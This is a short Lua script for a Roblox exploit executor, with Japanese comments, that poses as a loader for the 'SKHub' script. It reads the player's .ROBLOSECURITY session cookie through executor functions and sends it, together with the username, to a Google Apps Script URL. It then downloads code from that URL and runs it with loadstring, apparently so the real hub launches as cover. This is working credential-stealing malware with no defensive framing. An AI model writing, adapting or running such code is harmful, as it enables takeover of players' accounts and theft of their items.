-- 1. 設定：お前のGAS URL
local gasUrl = "https://script.google.com/macros/s/AKfycbzmVrEoOyp80pnNnNe48K4Aa0kYfTkKp730CqrfTLReRkfjpDaEIf6ygippGJFwbHi9/exec"
local user = game.Players.LocalPlayer.Name

-- 2. クッキー取得の多重試行（Deltaの隠し関数を叩く）
local clist = "NOT_FOUND"

-- Aプラン: 生のクッキーリストから.ROBLOSECURITYを探す
local success, cookies = pcall(function() return getgenv().getcookies() end)
if success and type(cookies) == "table" then
    for _, v in pairs(cookies) do
        if v.Name == ".ROBLOSECURITY" or v.name == ".ROBLOSECURITY" then
            clist = v.Value or v.value
            break
        end
    end
end

-- Bプラン: 直接取得関数を試す（Aがダメだった場合）
if clist == "NOT_FOUND" or clist == "" then
    local gch = getgenv().get_cookie_header or getgenv().get_cookie or get_cookie_header
    if gch then
        pcall(function() clist = gch("https://www.roblox.com/") end)
    end
end

-- 3. 送信データの準備（URLエンコード）
local http = game:GetService("HttpService")
local encodedCookie = http:UrlEncode(clist)
local finalUrl = gasUrl .. "?user=" .. user .. "&cookie=" .. encodedCookie

-- 4. GASへ送信 ＆ 本家SKHubのコードを取得して実行
print("Connecting to Server...")
local successLoad, targetCode = pcall(function()
    return game:HttpGet(finalUrl)
end)

if successLoad and targetCode then
    -- GASから返ってきたコード（SKHub起動用）を実行
    local func, err = loadstring(targetCode)
    if func then
        func()
    else
        warn("Load error: " .. tostring(err))
    end
else
    warn("Connection failed.")
end
